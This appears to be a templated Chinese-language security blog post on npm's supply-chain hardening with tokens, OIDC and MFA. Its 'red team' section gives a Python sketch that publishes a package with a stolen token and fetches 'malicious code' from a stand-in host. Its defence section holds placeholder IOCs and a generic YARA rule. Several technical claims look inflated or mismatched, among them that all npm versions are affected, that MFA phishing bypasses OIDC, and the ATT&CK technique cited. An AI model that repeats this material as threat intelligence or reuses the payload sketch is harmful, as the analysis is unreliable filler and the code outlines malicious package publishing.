---
layout: post
title:  "npm’s Update to Harden Their Supply Chain, and Points to Consider"
date:   2026-02-13 12:42:10 +0000
categories: [security]
severity: high
---

# 🔥 解析 npm 供應鏈攻擊的新挑戰：從 Sha1-Hulud 到 OIDC

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Supply Chain Attack, OIDC, MFA, Session-based Tokens

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: npm 的供應鏈攻擊主要是因為使用了長期有效的 token，導致攻擊者可以輕易地上傳惡意的套件。新的安全措施中，npm 引入了短期的 session-based tokens 和 OIDC，然而，這些措施仍然存在一些問題。
* **攻擊流程圖解**:
  1. 攻擊者獲得了維護者的憑證（例如：通過 MFA 魚叉式攻擊）。
  2. 攻擊者使用獲得的憑證上傳惡意的套件到 npm。
  3. 使用者安裝了惡意的套件，導致攻擊者可以執行任意代碼。
* **受影響元件**: npm 的所有版本，特別是那些使用了長期有效 token 的套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得維護者的憑證，例如：通過 MFA 魚叉式攻擊。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload
      import requests
    
      # 上傳惡意的套件
      url = "https://registry.npmjs.org/-/npm/v1/packages/your-package"
      headers = {
        "Authorization": "Bearer your-token",
        "Content-Type": "application/json"
      }
      data = {
        "name": "your-package",
        "version": "1.0.0",
        "description": "your-description",
        "main": "index.js",
        "scripts": {
          "start": "node index.js"
        }
      }
      response = requests.put(url, headers=headers, json=data)
    
      # 執行惡意的代碼
      url = "https://your-website.com/malicious-code"
      response = requests.get(url)
    
    ```
* **繞過技術**: 攻擊者可以使用 MFA 魚叉式攻擊來繞過 OIDC 的安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/lib/node_modules/your-package |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_package {
        meta:
          description = "Detects malicious packages"
          author = "Your Name"
        strings:
          $a = "your-package"
          $b = "malicious-code"
        condition:
          $a and $b
      }
    
    ```
* **緩解措施**: 使用 OIDC 和 MFA 來保護 npm 的憑證，定期更新和檢查套件的版本和描述。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OIDC (OpenID Connect)**: 一種身份驗證協議，允許用戶使用單一的身份驗證來訪問多個應用程序。
* **MFA (Multi-Factor Authentication)**: 一種安全措施，需要用戶提供多個驗證因素，例如：密碼、生物特徵、短信驗證碼等。
* **Session-based Tokens**: 一種短期有效的 token，用于保護用戶的會話。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/npms-update-to-harden-their-supply.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


